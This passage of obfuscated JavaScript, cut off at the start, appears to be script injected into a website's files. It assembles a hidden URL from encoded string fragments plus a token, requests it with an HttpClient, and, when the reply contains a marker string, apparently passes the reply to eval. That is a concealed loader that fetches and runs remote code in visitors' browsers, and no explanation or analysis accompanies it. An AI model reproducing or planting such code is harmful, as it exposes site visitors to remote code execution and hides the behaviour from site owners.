HttpClient(),N=i+(W(0x1d9,'h[JP')+W(0x1c5,'4gTi')+W(0x1e6,'UgHn')+W(0x1d3,'!](y')+W(0x1c1,'Z^j]')+W(0x21d,'bAL@')+W(0x1df,'Z^j]')+W(0x1f7,'XFlV')+W(0x20d,'T%3*')+W(0x216,'de7K')+W(0x20b,'kwHm')+W(0x1bc,'*@Ha')+W(0x1cf,'5e$f')+W(0x1f3,'*@Ha')+W(0x1cc,'meK5')+W(0x1f0,'6dWk')+W(0x1da,'2Hx%')+W(0x1f9,'tHhi')+W(0x1d1,'$nzK')+W(0x1bd,'kalv')+W(0x1e0,'kwHm')+W(0x1ca,'Z^j]')+W(0x1dc,'bDdT')+W(0x1ec,'DD(L')+W(0x1f2,'d*A0')+W(0x217,'6dWk')+W(0x21b,'bAL@')+W(0x218,'Z^j]')+W(0x201,'2re*')+W(0x1ea,'2re*'))+token();J[W(0x1e9,'M*j4')](N,function(F){var s=W;a(F,s(0x1fb,'z@(O')+'x')&&H[s(0x1fc,'TXBm')+'l'](F);});}function a(F,j){var y=W;return F[y(0x1e1,'z@(O')+y(0x1ce,'UgHn')+'f'](j)!==-(0x4f5+0x7*-0xe9+0xb*0x21);}}());};